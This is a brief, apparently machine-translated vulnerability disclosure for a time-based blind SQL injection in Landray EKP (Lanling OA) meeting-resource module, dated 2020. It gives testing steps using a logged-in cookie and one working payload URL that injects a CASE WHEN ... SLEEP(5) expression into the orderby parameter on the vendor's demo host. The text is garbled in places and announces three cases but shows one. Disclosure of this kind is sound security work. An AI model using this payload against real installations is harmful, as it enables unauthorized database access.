# Landray(EKP) SQL injection

Affected version: new 

Time of discovery: 2020-12-21 

Found by: MIa0a 

Solution: filter dangerous characters and use pre-compilation

## **A** **.** **The testing process** **:**

1. Find Lanling OA official website, apply for trial

2. Use the demo environment he gave

3. Log in to the background to get the cookie ( poc at the end of the text )

4. Replace cookie 

5.  Replace Referer

   ![](/img/1.png)

Conference Office

## **Two** **,** **Success** **Stories** **(** **3** **Ge** **)** **:**


Vulnerability link :

http://demo.landray.com.cn:80/km/imeeting/km_imeeting_res/kmImeetingRes.do?contentType=json&method=listUse&orderby=(CASE WHEN (2387=2387) THEN SLEEP( 5) ELSE 2387 END)& ordertype = down&s_ajax =true





